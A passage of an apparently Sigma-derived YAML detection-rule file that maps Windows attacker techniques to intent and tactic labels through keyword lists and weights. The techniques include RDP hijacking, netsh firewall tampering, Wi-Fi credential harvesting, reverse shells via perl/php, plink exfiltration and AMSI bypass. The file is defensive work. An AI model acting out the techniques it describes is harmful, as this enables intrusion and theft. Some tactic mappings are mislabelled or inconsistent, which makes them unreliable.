      - suspicious
      - child
      - process
      - veeam
      - dabatase
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6ba5a05f_b095_4f0a_8654_b825f4f16334
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects RDP session hijacking by using MSTSC shadowing
  conditions:
    summary:
      regex_any:
      - potential
      - mstsc
      - shadowing
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_954f0af7_62dd_418f_b3df_a84bc2c7a774
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects the usage of "mstsc.exe" with the "/v" flag to initiate a
    connection to a remote server.

    Adversaries may use valid accounts to log into a computer using the Remote Desktop
    Protocol (RDP). The adversary may then perform actions as the logged-on user.

    '
  conditions:
    summary:
      regex_any:
      - remote
      - desktop
      - connection
      - initiated
      - mstsc
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6e22722b_dfb1_4508_a911_49ac840b40f8
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects potential RDP connection via Mstsc using a local ".rdp" file
    located in suspicious locations.
  conditions:
    summary:
      regex_any:
      - suspicious
      - mstsc
      - execution
      - with
      - local
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ff3b6b39_e765_42f9_bb2c_ea6761e0e0f6
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects potential RDP connection via Mstsc using a local ".rdp" file
    located in suspicious locations.
  conditions:
    summary:
      regex_any:
      - mstsc
      - execution
      - from
      - uncommon
      - parent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9e50a8b3_dd05_4eb8_9153_bdb6b79d50b0
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of the MSXSL utility. This can be used to execute
    Extensible Stylesheet Language (XSL) files. These files are commonly used to describe
    the processing and rendering of data within XML files.

    Adversaries can abuse this functionality to execute arbitrary files while potentially
    bypassing application whitelisting defenses.

    '
  conditions:
    summary:
      regex_any:
      - msxsl
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_75d0a94e_6252_448d_a7be_d953dff527bb
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of the "msxsl" binary with an "http" keyword
    in the command line. This might indicate a potential remote execution of XSL files.
  conditions:
    summary:
      regex_any:
      - remote
      - execution
      - msxsl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd5cfd80_aa5f_44c0_9c20_108c4ae12e3c
  intent: unknown
  tactic: s0246
  description: Detects the addition of a new rule to the Windows firewall via netsh
  conditions:
    summary:
      regex_any:
      - firewall
      - rule
      - added
      - netsh
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a35f5a72_f347_4e36_8895_9869b0d5fc6d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects Netsh command execution that whitelists a program located in
    a suspicious location in the Windows Firewall
  conditions:
    summary:
      regex_any:
      - suspicious
      - program
      - location
      - whitelisted
      - firewall
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_01aeb693_138d_49d2_9403_c4f52d7d3d62
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of the netsh command to open and allow connections to
    port 3389 (RDP). As seen used by Sarwent Malware
  conditions:
    summary:
      regex_any:
      - connection
      - allowed
      - netsh
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1a5fefe6_734f_452e_a07d_fc1c35bce4b2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the removal of a port or application rule in the Windows Firewall
    configuration using netsh
  conditions:
    summary:
      regex_any:
      - firewall
      - rule
      - deleted
      - netsh
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_57c4bf16_227f_4394_8ec7_1b745ee061c3
  intent: unknown
  tactic: s0108
  description: Detects netsh commands that turns off the Windows firewall
  conditions:
    summary:
      regex_any:
      - firewall
      - disabled
      - netsh
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_347906f3_e207_4d18_ae5b_a9403d6bcdef
  intent: defense_evasion
  tactic: defense_evasion
  description: Adversaries may modify system firewalls in order to bypass controls
    limiting network usage
  conditions:
    summary:
      regex_any:
      - netsh
      - allow
      - group
      - policy
      - microsoft
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a70dcb37_3bee_453a_99df_d0c683151be6
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of netsh with the "advfirewall" and the "set" option
    in order to set new values for properties of a existing rule
  conditions:
    summary:
      regex_any:
      - firewall
      - rule
      - update
      - netsh
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_56321594_9087_49d9_bf10_524fe8479452
  intent: unknown
  tactic: s0108
  description: 'Detects the execution of netsh with "add helper" flag in order to
    add a custom helper DLL. This technique can be abused to add a malicious helper
    DLL that can be used as a persistence proxy that gets called when netsh.exe is
    executed.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - netsh
      - helper
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d3c3861d_c504_4c77_ba55_224ba82d0118
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the execution of netsh with the "trace" flag in order to start
    a network capture
  conditions:
    summary:
      regex_any:
      - network
      - trace
      - capture
      - started
      - netsh
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_322ed9ec_fcab_4f67_9a34_e7c6aef43614
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the execution of netsh commands that configure a new port forwarding
    (PortProxy) rule
  conditions:
    summary:
      regex_any:
      - port
      - forwarding
      - rule
      - added
      - netsh
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_782d6f3e_4c5d_4b8c_92a3_1d05fed72e63
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the execution of netsh to configure a port forwarding of port
    3389 (RDP) rule
  conditions:
    summary:
      regex_any:
      - port
      - forwarding
      - rule
      - added
      - netsh
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_42b1a5b8_353f_4f10_b256_39de4467faff
  intent: credential_harvesting
  tactic: credential_access
  description: Detect the harvesting of wifi credentials using netsh.exe
  conditions:
    summary:
      regex_any:
      - harvesting
      - wifi
      - credentials
      - netsh
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d95de845_b83c_4a9a_8a6a_4fc802ebf6c0
  intent: reconnaissance
  tactic: discovery
  description: 'Detects suspicious reconnaissance command line activity on Windows
    systems using Net.EXE

    Check if the user that executed the commands is suspicious (e.g. service accounts,
    LOCAL_SYSTEM)

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - group
      - account
      - reconnaissance
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd219ff3_fa99_45d4_8380_a7d15116c6dc
  intent: persistence_installation
  tactic: persistence
  description: Identifies the creation of local users via the net.exe command.
  conditions:
    summary:
      regex_any:
      - user
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b9f0e6f5_09b4_4358_bae4_08408705bd5c
  intent: persistence_installation
  tactic: persistence
  description: Detects creation of local users via the net.exe command with the option
    "never expire"
  conditions:
    summary:
      regex_any:
      - user
      - created
      - with
      - never
      - expire
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5b768e71_86f2_4879_b448_81061cbae951
  intent: data_staging
  tactic: collection
  description: Detects suspicious manipulations of default accounts such as 'administrator'
    and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc
  conditions:
    summary:
      regex_any:
      - suspicious
      - manipulation
      - default
      - accounts
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3abd6094_7027_475f_9630_8ab9be7b9725
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects when an admin share is mounted using net.exe
  conditions:
    summary:
      regex_any:
      - windows
      - admin
      - share
      - mount
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7e6237fe_3ddb_438f_9381_9bf9de5af8d0
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects when an internet hosted webdav share is mounted using the "net.exe"
    utility
  conditions:
    summary:
      regex_any:
      - windows
      - internet
      - hosted
      - webdav
      - share
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d4498716_1d52_438f_8084_4a603157d131
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects a when net.exe is called with a password in the command line
  conditions:
    summary:
      regex_any:
      - password
      - provided
      - command
      - line
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5cc90652_4cbd_4241_aa3b_4b462fa5a248
  intent: reconnaissance
  tactic: discovery
  description: Detects nltest commands that can be used for information discovery
  conditions:
    summary:
      regex_any:
      - potential
      - recon
      - activity
      - nltest
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6640f31c_01ad_49b5_beb5_83498a5cd8bd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution node.exe which is shipped with multiple software
    such as VMware, Adobe...etc. In order to execute arbitrary code. For example to
    establish reverse shell as seen in Log4j attacks...etc
  conditions:
    summary:
      regex_any:
      - potential
      - arbitrary
      - code
      - execution
      - node
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_df1f26d3_bea7_4700_9ea2_ad3e990cf90e
  intent: execution
  tactic: execution
  description: Detects the execution of other scripts using the Node executable packaged
    with Adobe Creative Cloud
  conditions:
    summary:
      regex_any:
      - node
      - process
      - executions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e6313acd_208c_44fc_a0ff_db85d572e90e
  intent: reconnaissance
  tactic: discovery
  description: Detects a set of suspicious network related commands often used in
    recon stages
  conditions:
    summary:
      regex_any:
      - network
      - reconnaissance
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1b3b01c7_84e9_4072_86e5_fc285a41ff23
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious powershell download cradle using nslookup. This
    cradle uses nslookup to extract payloads from DNS records
  conditions:
    summary:
      regex_any:
      - nslookup
      - powershell
      - download
      - cradle
      - processcreation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a58353df_af43_4753_bad0_cd83ef35eef5
  intent: credential_harvesting
  tactic: credential_access
  description: Detects execution of ntdsutil.exe to perform different actions such
    as restoring snapshots...etc.
  conditions:
    summary:
      regex_any:
      - suspicious
      - usage
      - active
      - directory
      - diagnostic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2afafd61_6aae_4df4_baed_139fa1f4c345
  intent: credential_harvesting
  tactic: credential_access
  description: Detects execution of ntdsutil.exe, which can be used for various attacks
    against the NTDS database (NTDS.DIT)
  conditions:
    summary:
      regex_any:
      - invocation
      - active
      - directory
      - diagnostic
      - tool
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3f5491e2_8db8_496b_9e95_1029fce852d4
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "odbcconf" with "INSTALLDRIVER" which installs
    a new ODBC driver. Attackers abuse this to install and run malicious DLLs.
  conditions:
    summary:
      regex_any:
      - driver
      - installation
      - odbcconf
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cb0fe7c5_f3a3_484d_aa25_d350a7912729
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "odbcconf" with the "INSTALLDRIVER" action where
    the driver doesn't contain a ".dll" extension. This is often used as a defense
    evasion method.
  conditions:
    summary:
      regex_any:
      - suspicious
      - driver
      - installation
      - odbcconf
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6b65c28e_11f3_46cb_902a_68f2cafaf474
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "odbcconf" where the path of the DLL being registered
    is located in a potentially suspicious location.
  conditions:
    summary:
      regex_any:
      - odbcconf
      - suspicious
      - location
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9f0a8bf3_a65b_440a_8c1e_5cb1547c8e70
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "odbcconf" with "REGSVR" in order to register
    a new DLL (equivalent to running regsvr32). Attackers abuse this to install and
    run malicious DLLs.
  conditions:
    summary:
      regex_any:
      - registered
      - odbcconf
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ba4cfc11_d0fa_4d94_bf20_7c332c412e76
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "odbcconf" with the "REGSVR" action where the
    DLL in question doesn't contain a ".dll" extension. Which is often used as a method
    to evade defenses.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - registered
      - odbcconf
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5f03babb_12db_4eec_8c82_7b4cb5580868
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "odbcconf" with the "-f" flag in order to load
    a response file which might contain a malicious action.
  conditions:
    summary:
      regex_any:
      - response
      - file
      - execution
      - odbcconf
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2d32dd6f_3196_4093_b9eb_1ad8ab088ca5
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "odbcconf" with the "-f" flag in order to load
    a response file with a non-".rsp" extension.
  conditions:
    summary:
      regex_any:
      - suspicious
      - response
      - file
      - execution
      - odbcconf
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8e3c7994_131e_4ba5_b6ea_804d49113a26
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects an uncommon child process of "odbcconf.exe" binary which normally
    shouldn't have any child processes.
  conditions:
    summary:
      regex_any:
      - uncommon
      - child
      - process
      - spawned
      - odbcconf
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4ae3e30b_b03f_43aa_87e3_b622f4048eed
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential arbitrary file download using a Microsoft Office
    application
  conditions:
    summary:
      regex_any:
      - potential
      - arbitrary
      - file
      - download
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_551d9c1f_816c_445b_a7a6_7a3864720d60
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects suspicious child processes of Excel which could be an indicator
    of lateral movement leveraging the "ActivateMicrosoftApp" Excel DCOM object.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - excel
      - dcom
      - lateral
      - movement
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f99abdf0_6283_4e71_bd2b_b5c048a94743
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of an Office application that points to a document
    that is located in a trusted location. Attackers often used this to avoid macro
    security and execute their malicious code.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - office
      - document
      - executed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_84b1706c_932a_44c4_ae28_892b28a25b94
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of malicious OneNote documents that contain
    embedded scripts.

    When a user clicks on a OneNote attachment and then on the malicious link inside
    the ".one" file, it exports and executes the malicious embedded script from specific
    directories.

    '
  conditions:
    summary:
      regex_any:
      - onenote
      - execution
      - malicious
      - embedded
      - scripts
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c27515df_97a9_4162_8a60_dc0eeb51b775
  intent: unknown
  tactic: initial_access
  description: Detects suspicious child processes of the Microsoft OneNote application.
    This may indicate an attempt to execute malicious embedded objects from a .one
    file.
  conditions:
    summary:
      regex_any:
      - suspicious
      - microsoft
      - onenote
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_55f0a3a1_846e_40eb_8273_677371b8d912
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects an attacker trying to enable the outlook security setting "EnableUnsafeClientMailRules"
    which allows outlook to run applications or execute macros
  conditions:
    summary:
      regex_any:
      - outlook
      - enableunsafeclientmailrules
      - setting
      - enabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a018fdc3_46a3_44e5_9afb_2cd4af1d4b39
  intent: unknown
  tactic: initial_access
  description: Detects a suspicious program execution in Outlook temp folder
  conditions:
    summary:
      regex_any:
      - suspicious
      - execution
      - from
      - outlook
      - temporary
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_208748f7_881d_47ac_a29c_07ea84bf691d
  intent: execution
  tactic: execution
  description: Detects a suspicious process spawning from an Outlook process.
  conditions:
    summary:
      regex_any:
      - suspicious
      - outlook
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e212d415_0e93_435f_9e1a_f29005bb4723
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a suspicious child process spawning from Outlook where the
    image is located in a remote location (SMB/WebDav shares).
  conditions:
    summary:
      regex_any:
      - suspicious
      - remote
      - child
      - process
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aa3a6f94_890e_4e22_b634_ffdfd54792cc
  intent: unknown
  tactic: g0046
  description: Detects an executable in the users directory started from one of the
    Microsoft Office suite applications (Word, Excel, PowerPoint, Publisher, Visio)
  conditions:
    summary:
      regex_any:
      - suspicious
      - binary
      - user
      - directory
      - spawned
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_438025f9_5856_4663_83f7_52f878a70a50
  intent: execution
  tactic: execution
  description: Detects a suspicious process spawning from one of the Microsoft Office
    suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)
  conditions:
    summary:
      regex_any:
      - suspicious
      - microsoft
      - office
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f7375e28_5c14_432f_b8d1_1db26c832df3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential DLL sideloading using the Microsoft Office winword
    process via the '/l' flag.
  conditions:
    summary:
      regex_any:
      - potential
      - arbitrary
      - load
      - using
      - winword
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_02b18447_ea83_4b1b_8805_714a8a34546a
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of Windows Defender "OfflineScannerShell.exe" from
    its non standard directory.

    The "OfflineScannerShell.exe" binary is vulnerable to DLL side loading and will
    load any DLL named "mpclient.dll" from the current working directory.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - mpclient
      - sideloading
      - offlinescannershell
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d679950c_abb7_43a6_80fb_2a480c4fc450
  intent: lateral_movement
  tactic: lateral_movement
  description: Detect use of PDQ Deploy remote admin tool
  conditions:
    summary:
      regex_any:
      - deploy
      - remote
      - adminstartion
      - tool
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_12b8e9f5_96b2_41e1_9a42_8c6779a5c184
  intent: execution
  tactic: execution
  description: Detects suspicious execution of "PDQDeployRunner" which is part of
    the PDQDeploy service stack that is responsible for executing commands and packages
    on a remote machines
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - execution
      - pdqdeployrunner
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f426547a_e0f7_441a_b63e_854ac5bdf54d
  intent: execution
  tactic: execution
  description: Detects execution of perl using the "-e"/"-E" flags. This is could
    be used as a way to launch a reverse shell or execute live perl code.
  conditions:
    summary:
      regex_any:
      - perl
      - inline
      - command
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d81871ef_5738_47ab_9797_7a9c90cd4bfb
  intent: execution
  tactic: execution
  description: Detects execution of php using the "-r" flag. This is could be used
    as a way to launch a reverse shell or execute live php code.
  conditions:
    summary:
      regex_any:
      - inline
      - command
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1a0d4aba_7668_4365_9ce4_6d79ab088dfd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a ping command that uses a hex encoded IP address
  conditions:
    summary:
      regex_any:
      - ping
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f956c7c1_0f60_4bc5_b7d7_b39ab3c08908
  intent: credential_harvesting
  tactic: credential_access
  description: Detects execution of PktMon, a tool that captures network packets.
  conditions:
    summary:
      regex_any:
      - pktmon
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_48a61b29_389f_4032_b317_b30de6b95314
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects suspicious Plink tunnel port forwarding to a local port
  conditions:
    summary:
      regex_any:
      - suspicious
      - plink
      - port
      - forwarding
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f38ce0b9_5e97_4b47_a211_7dc8d8b871da
  intent: command_and_control_setup
  tactic: command_and_control
  description: Execution of plink to perform data exfiltration and tunneling
  conditions:
    summary:
      regex_any:
      - potential
      - tunneling
      - plink
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f8d6a15e_4bc8_4c27_8e5d_2b10f0b73e5b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious execution of 'Powercfg.exe' to change lock screen
    timeout
  conditions:
    summary:
      regex_any:
      - suspicious
      - powercfg
      - execution
      - change
      - lock
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c86500e9_a645_4680_98d7_f882c70c1ea3
  intent: impact_operations
  tactic: impact
  description: Detects ADDInternals Cmdlet execution. A tool for administering Azure
    AD and Office 365. Which can be abused by threat actors to attack Azure AD or
    Office 365.
  conditions:
    summary:
      regex_any:
      - aadinternals
      - powershell
      - cmdlets
      - execution
      - proccesscreation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_70bc5215_526f_4477_963c_a47a5c9ebd12
  intent: impact_operations
  tactic: impact
  description: Detects usage of the "Import-Module" cmdlet to load the "Microsoft.ActiveDirectory.Management.dl"
    DLL. Which is often used by attackers to perform AD enumeration.
  conditions:
    summary:
      regex_any:
      - potential
      - active
      - directory
      - enumeration
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b36d01a3_ddaf_4804_be18_18a6247adfcd
  intent: execution
  tactic: execution
  description: Detects usage of the "Add-WindowsCapability" cmdlet to add Windows
    capabilities. Notable capabilities could be "OpenSSH" and others.
  conditions:
    summary:
      regex_any:
      - windows
      - capability
      - powershell
      - cmdlet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_30edb182_aa75_42c0_b0a9_e998bb29067c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects Request to "amsiInitFailed" that can be used to disable AMSI
    Scanning
  conditions:
    summary:
      regex_any:
      - potential
      - amsi
      - bypass
      - reflection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_92a974db_ab84_457f_9ec0_55db83d7a825
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of special strings/null bits in order to potentially
    bypass AMSI functionalities
  conditions:
    summary:
      regex_any:
      - potential
      - amsi
      - bypass
      - using
      - 'null'
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_932fb0d8_692b_4b0f_a26e_5643a50fe7d6
  intent: data_staging
  tactic: collection
  description: Detects audio capture via PowerShell Cmdlet.
  conditions:
    summary:
      regex_any:
      - audio
      - capture
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ca2092a1_c273_4878_9b4b_0d60115bf5ea
  intent: execution
  tactic: execution
  description: Detects suspicious powershell process starts with base64 encoded commands
    (e.g. Emotet)
  conditions:
    summary:
      regex_any:
      - suspicious
      - encoded
      - powershell
      - command
      - line
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b9d9cc83_380b_4ba3_8d8f_60c0e7e2930c
  intent: execution
  tactic: execution
  description: Detects PowerShell command line patterns in combincation with encoded
    commands that often appear in malware infection chains
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - encoded
      - command
      - patterns
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8d01b53f_456f_48ee_90f6_bc28e67d4e35
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious UTF16 and base64 encoded and often obfuscated PowerShell
    code often used in command lines
  conditions:
    summary:
      regex_any:
      - suspicious
      - obfuscated
      - powershell
      - code
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fdb62a13_9a81_4e5c_a38f_ea93a16f6d7c
  intent: execution
  tactic: execution
  description: Detects usage of a base64 encoded "FromBase64String" cmdlet in a process
    command line
  conditions:
    summary:
      regex_any:
      - powershell
      - base64
      - encoded
      - frombase64string
      - cmdlet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f26c6093_6f14_4b12_800f_0fcb46f5ffd0
  intent: execution
  tactic: execution
  description: Detects base64 encoded strings used in hidden malicious PowerShell
    command lines
  conditions:
    summary:
      regex_any:
      - malicious
      - base64
      - encoded
      - powershell
      - keywords
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_88f680b8_070e_402c_ae11_d2914f2257f1
  intent: execution
  tactic: execution
  description: Detects usage of a base64 encoded "IEX" cmdlet in a process command
    line
  conditions:
    summary:
      regex_any:
      - powershell
      - base64
      - encoded
      - cmdlet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6385697e_9f1b_40bd_8817_f4a91f40508e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects UTF-8 and UTF-16 Base64 encoded powershell 'Invoke-' calls
  conditions:
    summary:
      regex_any:
      - powershell
      - base64
      - encoded
      - invoke
      - keyword
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c6fb44c6_71f5_49e6_9462_1425d328aee3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects base64 encoded "MpPreference" PowerShell cmdlet code that tries
    to modifies or tamper with Windows Defender AV
  conditions:
    summary:
      regex_any:
      - powershell
      - base64
      - encoded
      - mppreference
      - cmdlet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_62b7ccc9_23b4_471e_aa15_6da3663c4d59
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects base64 encoded .NET reflective loading of Assembly
  conditions:
    summary:
      regex_any:
      - powershell
      - base64
      - encoded
      - reflective
      - assembly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9c0295ce_d60d_40bd_bd74_84673b7592b1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious base64 encoded and obfuscated "LOAD" keyword used
    in .NET "reflection.assembly"
  conditions:
    summary:
      regex_any:
      - suspicious
      - encoded
      - obfuscated
      - reflection
      - assembly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1816994b_42e1_4fb1_afd2_134d88184f71
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects calls to base64 encoded WMI class such as "Win32_ShadowCopy",
    "Win32_ScheduledJob", etc.
  conditions:
    summary:
      regex_any:
      - powershell
      - base64
      - encoded
      - classes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a0459f02_ac51_4c09_b511_b8c9203fc429
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects calls to "SyncInvoke" that is part of the "CL_Invocation.ps1"
    script to proxy execution using "System.Diagnostics.Process"
  conditions:
    summary:
      regex_any:
      - potential
      - process
      - execution
      - proxy
      - cl_invocation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c57872c7_614f_4d7f_a40d_b78c8df2d30d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects calls to "LoadAssemblyFromPath" or "LoadAssemblyFromNS" that
    are part of the "CL_LoadAssembly.ps1" script. This can be abused to load different
    assemblies and bypass App locker controls.
  conditions:
    summary:
      regex_any:
      - assembly
      - loading
      - cl_loadassembly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
